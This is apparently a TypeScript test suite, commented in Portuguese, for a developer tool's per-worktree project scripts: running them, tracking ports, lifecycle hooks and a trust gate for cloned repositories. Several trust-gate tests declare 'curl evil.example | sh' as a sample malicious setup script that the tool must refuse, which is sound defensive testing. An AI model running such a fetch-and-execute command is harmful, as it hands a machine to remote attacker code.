import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";

import { parse as parseToml } from "smol-toml";
import { afterEach, describe, expect, it, vi } from "vitest";

import { PROJECT_FILE } from "../memory/project-identity.js";
import { createProjectRepository } from "../repositories/project.js";
import { createTestCaller, type TestCaller } from "../testing/caller.js";
import { cleanupGitFixtures, createRepo, runGit, tempDir } from "../testing/git-fixtures.js";

let context: TestCaller;

interface Fixture {
  ctx: TestCaller;
  projectId: string;
  worktreeId: string;
  worktreePath: string;
  repo: string;
}

/** Escreve o `[scripts]` dentro de um checkout, como o repositório do time faria. */
function declare(checkout: string, scripts: Record<string, string>): void {
  const path = join(checkout, PROJECT_FILE);
  mkdirSync(dirname(path), { recursive: true });
  const body = Object.entries(scripts)
    .map(([phase, command]) => `${phase} = ${JSON.stringify(command)}`)
    .join("\n");
  writeFileSync(path, `id = "prj_teste"\n\n[scripts]\n${body}\n`, "utf8");
}

/**
 * Declara e **commita**.
 *
 * Worktree nova é um checkout do que está commitado: um `project.toml` que só
 * existe na árvore de trabalho do projeto não chega nela. É a consequência direta
 * da S7 — o arquivo que vale é o do checkout —, e é o que faz o gancho de criação
 * só funcionar para quem versionou os scripts, que é a promessa da feature.
 */
async function declareCommitted(repo: string, scripts: Record<string, string>): Promise<void> {
  declare(repo, scripts);
  await runGit(repo, "add", "-A");
  await runGit(repo, "commit", "-m", "scripts do projeto");
}

async function setup(): Promise<Fixture> {
  context = createTestCaller({ LUMEM_STATE_DIR: tempDir("lumem-state-"), SHELL: "/bin/sh" });
  const workspace = await context.api.workspace.create({ name: "pessoal" });
  const repo = await createRepo({ branch: "main" });
  const project = await context.api.project.add({
    workspaceId: workspace.id,
    path: repo,
    name: "lorebase",
  });
  const worktree = await context.api.worktree.create({ projectId: project.id, name: "teste" });
  return {
    ctx: context,
    projectId: project.id,
    worktreeId: worktree.id,
    worktreePath: worktree.path,
    repo,
  };
}

/** Espera a fase terminar, sem depender de tempo de máquina. */
async function waitExited(ctx: TestCaller, scope: { scopeType: "worktree"; scopeId: string }, phase: "setup" | "run" | "teardown") {
  await vi.waitFor(
    async () => {
      const status = await ctx.api.scripts.status(scope);
      expect(status[phase].last?.running).toBe(false);
    },
    { timeout: 10_000 },
  );
}

afterEach(async () => {
  await context?.cleanup();
  cleanupGitFixtures();
});

describe("scripts.status", () => {
  it("projeto sem o arquivo: as três fases vazias, e o caminho onde ele moraria", async () => {
    // O estado normal, não o excepcional: é assim que todo projeto entra.
    const { ctx, worktreeId, worktreePath } = await setup();

    const status = await ctx.api.scripts.status({ scopeType: "worktree", scopeId: worktreeId });

    expect(status.scripts).toEqual({ setup: null, run: null, teardown: null });
    expect(status.file).toBe(join(worktreePath, PROJECT_FILE));
    expect(status.setup.last).toBeNull();
  });

  it("lê o `[scripts]` do checkout, e não o do projeto", async () => {
    // S7: cada worktree tem o seu, e uma branch que mexe no setup muda só ela.
    const { ctx, worktreeId, worktreePath, projectId, repo } = await setup();
    declare(repo, { run: "echo do-projeto" });
    declare(worktreePath, { run: "echo da-worktree" });

    const daWorktree = await ctx.api.scripts.status({ scopeType: "worktree", scopeId: worktreeId });
    const doProjeto = await ctx.api.scripts.status({ scopeType: "project", scopeId: projectId });

    expect(daWorktree.scripts.run).toBe("echo da-worktree");
    expect(doProjeto.scripts.run).toBe("echo do-projeto");
  });

  it("ler não aloca porta — a tela pergunta muito mais do que alguém roda", async () => {
    const { ctx, worktreeId } = await setup();

    const status = await ctx.api.scripts.status({ scopeType: "worktree", scopeId: worktreeId });

    expect(status.reservedPort).toBeNull();
  });

  it("escopo que não existe é NOT_FOUND, e não um status vazio", async () => {
    const { ctx } = await setup();

    await expect(
      ctx.api.scripts.status({ scopeType: "worktree", scopeId: "nao-existe" }),
    ).rejects.toMatchObject({ code: "NOT_FOUND" });
  });
});

describe("scripts.start", () => {
  it("roda o comando declarado, no diretório do checkout", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { setup: "pwd > pwd.txt" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "setup" });
    await waitExited(ctx, scope, "setup");

    expect(readFileSync(join(worktreePath, "pwd.txt"), "utf8").trim()).toContain(
      worktreePath.replace(/^\/private/, ""),
    );
  });

  it("entrega o ambiente que o §4 promete, com a porta reservada", async () => {
    const { ctx, worktreeId, worktreePath, projectId } = await setup();
    declare(worktreePath, {
      // `echo` linha a linha, e não `printenv` com vários nomes: o `printenv`
      // para na primeira variável vazia, e o teste passaria a medir a ordem dos
      // argumentos em vez do ambiente.
      setup:
        'for v in LUMEM_PROJECT_ID LUMEM_WORKTREE_ID LUMEM_RUN_PORT LUMEM_RUN_PORT_2 LUMEM_SCRIPT; do eval "echo \\$$v"; done > env.txt',
    });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "setup" });
    await waitExited(ctx, scope, "setup");

    const [project, worktree, port, secondPort, phase] = readFileSync(
      join(worktreePath, "env.txt"),
      "utf8",
    )
      .trim()
      .split("\n");
    expect(project).toBe(projectId);
    expect(worktree).toBe(worktreeId);
    expect(phase).toBe("setup");
    // O bloco, e não uma porta só: monorepo sobe dois serviços (S5).
    expect(Number(secondPort)).toBe(Number(port) + 1);

    const status = await ctx.api.scripts.status(scope);
    expect(status.reservedPort).toBe(Number(port));
  });

  it("a porta reservada é a mesma entre execuções", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { setup: 'echo "$LUMEM_RUN_PORT" >> portas.txt' });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "setup" });
    await waitExited(ctx, scope, "setup");
    await ctx.api.scripts.start({ ...scope, phase: "setup" });
    await vi.waitFor(() => {
      expect(readFileSync(join(worktreePath, "portas.txt"), "utf8").trim().split("\n")).toHaveLength(2);
    });

    const [first, second] = readFileSync(join(worktreePath, "portas.txt"), "utf8").trim().split("\n");
    expect(second).toBe(first);
  });

  it("recusa a fase que o repositório não declara, dizendo onde declarar", async () => {
    const { ctx, worktreeId } = await setup();

    await expect(
      ctx.api.scripts.start({ scopeType: "worktree", scopeId: worktreeId, phase: "run" }),
    ).rejects.toMatchObject({ message: /scripts\.run/ });
  });

  /** A4: dois `pnpm dev` no mesmo checkout brigam pela mesma porta. */
  it("um run vivo por checkout — começar outro para o anterior, e diz que parou", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    const first = await ctx.api.scripts.start({ ...scope, phase: "run" });
    const second = await ctx.api.scripts.start({ ...scope, phase: "run" });

    expect(second.stoppedPrevious).toBe(first.sessionId);
    expect(second.sessionId).not.toBe(first.sessionId);
    await vi.waitFor(async () => {
      const status = await ctx.api.scripts.status(scope);
      expect(status.run.last?.sessionId).toBe(second.sessionId);
      expect(status.run.last?.running).toBe(true);
    });
  });

  it("setup e run convivem — são coisas diferentes", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "sleep 30", setup: "sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "run" });
    await ctx.api.scripts.start({ ...scope, phase: "setup" });

    const status = await ctx.api.scripts.status(scope);
    expect(status.run.last?.running).toBe(true);
    expect(status.setup.last?.running).toBe(true);
  });

  it("a linha guarda o comando declarado, e não o shell que o carrega", async () => {
    // Visto rodando o produto: a lista de sessões do projeto mostrava toda
    // execução de script como "shell /bin/zsh" — o mecanismo no lugar da intenção.
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    const started = await ctx.api.scripts.start({ ...scope, phase: "run" });

    const row = await ctx.api.session.getDetail({ id: started.sessionId });
    expect(row.command).toBe("sleep 30");
    expect(row.scriptName).toBe("run");
  });

  it("a sessão de script não vira aba de sessão", async () => {
    // O rodapé é o lugar dela. Aparecer também como aba seria a mesma coisa em
    // dois lugares, com dois jeitos de fechar.
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "run" });

    const sessions = await ctx.api.session.listByScope(scope);
    expect(sessions.filter((row) => row.kind === "script")).toHaveLength(1);
    expect(sessions.filter((row) => row.kind === "shell")).toHaveLength(0);
  });
});

describe("scripts.stop", () => {
  it("para o que está vivo", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;
    const started = await ctx.api.scripts.start({ ...scope, phase: "run" });

    const { stopped } = await ctx.api.scripts.stop({ ...scope, phase: "run" });

    expect(stopped).toBe(started.sessionId);
    await waitExited(ctx, scope, "run");
  });

  it("parar o que não está rodando é no-op, e não erro de ninguém", async () => {
    // O botão pode chegar depois de o processo ter morrido sozinho.
    const { ctx, worktreeId } = await setup();

    const { stopped } = await ctx.api.scripts.stop({
      scopeType: "worktree",
      scopeId: worktreeId,
      phase: "run",
    });

    expect(stopped).toBeNull();
  });
});

describe("a porta do run, e de onde ela veio", () => {
  it("lê da saída quando o script não usa a variável", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "echo 'Local: http://127.0.0.1:5173/'; sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "run" });

    await vi.waitFor(async () => {
      const status = await ctx.api.scripts.status(scope);
      expect(status.port).toEqual({ port: 5_173, source: "output" });
    });
  });

  it("quando o script usa a variável, a porta é a reserva e a origem é `env`", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: 'echo "subindo em $LUMEM_RUN_PORT"; sleep 30' });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.start({ ...scope, phase: "run" });

    const status = await ctx.api.scripts.status(scope);
    expect(status.port).toEqual({ port: status.reservedPort, source: "env" });
  });

  it("a porta some quando o run para — ela descreve um processo, não um checkout", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    declare(worktreePath, { run: "echo 'Local: http://127.0.0.1:5173/'; sleep 30" });
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;
    await ctx.api.scripts.start({ ...scope, phase: "run" });
    await vi.waitFor(async () => {
      expect((await ctx.api.scripts.status(scope)).port).not.toBeNull();
    });

    await ctx.api.scripts.stop({ ...scope, phase: "run" });

    await vi.waitFor(async () => {
      expect((await ctx.api.scripts.status(scope)).port).toBeNull();
    });
  });
});

describe("o portão de confiança (S11)", () => {
  /** Projeto gerenciado é o que veio de uma URL colada. */
  async function managed(fixture: Fixture): Promise<void> {
    await fixture.ctx.db
      .update((await import("../db/schema.js")).project)
      .set({ managed: true })
      .where((await import("drizzle-orm")).eq((await import("../db/schema.js")).project.id, fixture.projectId));
  }

  it("projeto apontado por caminho roda sem perguntar", async () => {
    // Repositório que já estava no disco e que a pessoa apontou: o comando é
    // dela, e perguntar aí treinaria o clique automático.
    const fixture = await setup();
    declare(fixture.worktreePath, { setup: "true" });

    const status = await fixture.ctx.api.scripts.status({
      scopeType: "worktree",
      scopeId: fixture.worktreeId,
    });

    expect(status.trusted).toBe(true);
  });

  it("projeto clonado nasce não confiado, e a recusa carrega o comando", async () => {
    const fixture = await setup();
    await managed(fixture);
    declare(fixture.worktreePath, { setup: "curl evil.example | sh" });

    const status = await fixture.ctx.api.scripts.status({
      scopeType: "worktree",
      scopeId: fixture.worktreeId,
    });
    expect(status.trusted).toBe(false);

    // A recusa mostra o que ia rodar: é a tela do quadro 7 do desenho.
    await expect(
      fixture.ctx.api.scripts.start({
        scopeType: "worktree",
        scopeId: fixture.worktreeId,
        phase: "setup",
      }),
    ).rejects.toMatchObject({ message: /curl evil\.example \| sh/ });
  });

  it("confiar libera, e vale para o projeto inteiro", async () => {
    const fixture = await setup();
    await managed(fixture);
    declare(fixture.repo, { setup: "true" });
    declare(fixture.worktreePath, { setup: "true" });

    await fixture.ctx.api.scripts.trust({ scopeType: "worktree", scopeId: fixture.worktreeId });

    const status = await fixture.ctx.api.scripts.status({
      scopeType: "worktree",
      scopeId: fixture.worktreeId,
    });
    expect(status.trusted).toBe(true);
  });

  it("comando que mudou depois de confiado volta a perguntar", async () => {
    // Confiança é sobre **este** comando: um `git pull` que troca o script não
    // pode herdar a aprovação do anterior.
    const fixture = await setup();
    await managed(fixture);
    declare(fixture.repo, { setup: "true" });
    declare(fixture.worktreePath, { setup: "true" });
    await fixture.ctx.api.scripts.trust({ scopeType: "worktree", scopeId: fixture.worktreeId });

    declare(fixture.worktreePath, { setup: "curl evil.example | sh" });

    const status = await fixture.ctx.api.scripts.status({
      scopeType: "worktree",
      scopeId: fixture.worktreeId,
    });
    expect(status.trusted).toBe(false);
  });
});

describe("scripts.writeFile", () => {
  it("cria o arquivo no repositório de quem está lendo, sem commitar", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();

    await ctx.api.scripts.writeFile({
      scopeType: "worktree",
      scopeId: worktreeId,
      run: "pnpm dev",
    });

    const path = join(worktreePath, PROJECT_FILE);
    expect(existsSync(path)).toBe(true);
    expect(parseToml(readFileSync(path, "utf8"))).toMatchObject({ scripts: { run: "pnpm dev" } });
    // Não commitado: aparece como mudança comum, e quem commita é a pessoa.
    const changes = await ctx.api.changes.list({
      scopeType: "worktree",
      scopeId: worktreeId,
      ref: "worktree",
    });
    expect(changes.files.map((file) => file.path)).toContain(".lumem/project.toml");
  });

  it("preserva o `id` que o arquivo já tinha", async () => {
    const { ctx, worktreeId, worktreePath } = await setup();
    const path = join(worktreePath, PROJECT_FILE);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, 'id = "prj_existente"\n', "utf8");

    await ctx.api.scripts.writeFile({
      scopeType: "worktree",
      scopeId: worktreeId,
      setup: "./setup.sh",
    });

    expect(parseToml(readFileSync(path, "utf8"))).toMatchObject({
      id: "prj_existente",
      scripts: { setup: "./setup.sh" },
    });
  });

  it("o que ele escreve é o que o status passa a ler", async () => {
    const { ctx, worktreeId } = await setup();
    const scope = { scopeType: "worktree", scopeId: worktreeId } as const;

    await ctx.api.scripts.writeFile({ ...scope, run: "pnpm dev" });

    expect((await ctx.api.scripts.status(scope)).scripts.run).toBe("pnpm dev");
  });
});

describe("hashScripts é sobre os três juntos", () => {
  it("aprovar o run não aprova um setup que chegou depois", async () => {
    const fixture = await setup();
    await fixture.ctx.db
      .update((await import("../db/schema.js")).project)
      .set({ managed: true })
      .where(
        (await import("drizzle-orm")).eq(
          (await import("../db/schema.js")).project.id,
          fixture.projectId,
        ),
      );
    declare(fixture.repo, { run: "pnpm dev" });
    declare(fixture.worktreePath, { run: "pnpm dev" });
    await fixture.ctx.api.scripts.trust({ scopeType: "worktree", scopeId: fixture.worktreeId });

    declare(fixture.worktreePath, { run: "pnpm dev", setup: "curl evil.example | sh" });

    const status = await fixture.ctx.api.scripts.status({
      scopeType: "worktree",
      scopeId: fixture.worktreeId,
    });
    expect(status.trusted).toBe(false);
    expect(createProjectRepository(fixture.ctx.db)).toBeDefined();
  });
});

describe("os ganchos de ciclo de vida", () => {
  it("worktree nova roda o setup sozinha, em segundo plano (S3)", async () => {
    const { ctx, projectId, repo } = await setup();
    await declareCommitted(repo, { setup: "echo preparada > preparada.txt" });

    const worktree = await ctx.api.worktree.create({ projectId, name: "nova" });

    // A mutação voltou antes de o script terminar — é isso que "segundo plano"
    // quer dizer —, e o rodapé é quem conta o resto.
    await vi.waitFor(
      async () => {
        const status = await ctx.api.scripts.status({
          scopeType: "worktree",
          scopeId: worktree.id,
        });
        expect(status.setup.last?.running).toBe(false);
        expect(status.setup.last?.exitCode).toBe(0);
      },
      { timeout: 10_000 },
    );
    expect(existsSync(join(worktree.path, "preparada.txt"))).toBe(true);
  });

  it("setup que falha deixa a worktree de pé, marcada (S4)", async () => {
    // Desfazer seria apagar diretório por causa de rede ruim.
    const { ctx, projectId, repo } = await setup();
    await declareCommitted(repo, { setup: "exit 1" });

    const worktree = await ctx.api.worktree.create({ projectId, name: "quebrada" });

    await vi.waitFor(async () => {
      const status = await ctx.api.scripts.status({
        scopeType: "worktree",
        scopeId: worktree.id,
      });
      expect(status.setup.last?.exitCode).toBe(1);
    }, { timeout: 10_000 });
    const worktrees = await ctx.api.worktree.listByProject({ projectId });
    expect(worktrees.find((row) => row.id === worktree.id)?.present).toBe(true);
  });

  it("projeto sem setup declarado cria worktree e não roda nada — isso não é erro", async () => {
    const { ctx, projectId } = await setup();

    const worktree = await ctx.api.worktree.create({ projectId, name: "sem-setup" });

    const status = await ctx.api.scripts.status({ scopeType: "worktree", scopeId: worktree.id });
    expect(status.setup.last).toBeNull();
  });

  it("remover roda o teardown antes de o diretório sumir (S8)", async () => {
    const { ctx, projectId, repo } = await setup();
    const marca = join(repo, "teardown-rodou.txt");
    await declareCommitted(repo, { teardown: `echo tchau > ${marca}` });
    const worktree = await ctx.api.worktree.create({ projectId, name: "com-teardown" });

    await ctx.api.worktree.remove({ id: worktree.id });

    expect(existsSync(marca)).toBe(true);
    expect(existsSync(worktree.path)).toBe(false);
  });

  it("teardown que falha NÃO impede a remoção", async () => {
    // Worktree que não se apaga por causa de um script quebrado é pior que a
    // sujeira que o script ia limpar.
    const { ctx, projectId, repo } = await setup();
    await declareCommitted(repo, { teardown: "exit 1" });
    const worktree = await ctx.api.worktree.create({ projectId, name: "teardown-ruim" });

    await ctx.api.worktree.remove({ id: worktree.id });

    expect(existsSync(worktree.path)).toBe(false);
  });

  it("run vivo não bloqueia a remoção: ele é do daemon, e morre com o checkout", async () => {
    const { ctx, projectId, repo } = await setup();
    await declareCommitted(repo, { run: "sleep 30" });
    const worktree = await ctx.api.worktree.create({ projectId, name: "com-run" });
    const scope = { scopeType: "worktree", scopeId: worktree.id } as const;
    const started = await ctx.api.scripts.start({ ...scope, phase: "run" });

    await ctx.api.worktree.remove({ id: worktree.id });

    expect(existsSync(worktree.path)).toBe(false);
    await vi.waitFor(() => {
      expect(ctx.ptyManager.get(started.sessionId)?.state).toBe("exited");
    });
  });

  it("sessão de agente continua bloqueando — essa é sua", async () => {
    const { ctx, projectId } = await setup();
    const worktree = await ctx.api.worktree.create({ projectId, name: "com-shell" });
    await ctx.api.session.createShell({ scopeType: "worktree", scopeId: worktree.id });

    await expect(ctx.api.worktree.remove({ id: worktree.id })).rejects.toMatchObject({
      message: /encerre-as antes/,
    });
  });

  it("remover devolve o bloco de portas", async () => {
    // Sem isto a faixa vaza: cada worktree criada e removida levaria dez portas.
    const { ctx, projectId, repo } = await setup();
    await declareCommitted(repo, { run: "true" });
    const first = await ctx.api.worktree.create({ projectId, name: "primeira" });
    await ctx.api.scripts.start({ scopeType: "worktree", scopeId: first.id, phase: "run" });
    const port = (await ctx.api.scripts.status({ scopeType: "worktree", scopeId: first.id }))
      .reservedPort;

    await ctx.api.worktree.remove({ id: first.id, force: true });
    const second = await ctx.api.worktree.create({ projectId, name: "segunda" });
    await ctx.api.scripts.start({ scopeType: "worktree", scopeId: second.id, phase: "run" });

    expect(
      (await ctx.api.scripts.status({ scopeType: "worktree", scopeId: second.id })).reservedPort,
    ).toBe(port);
  });
});
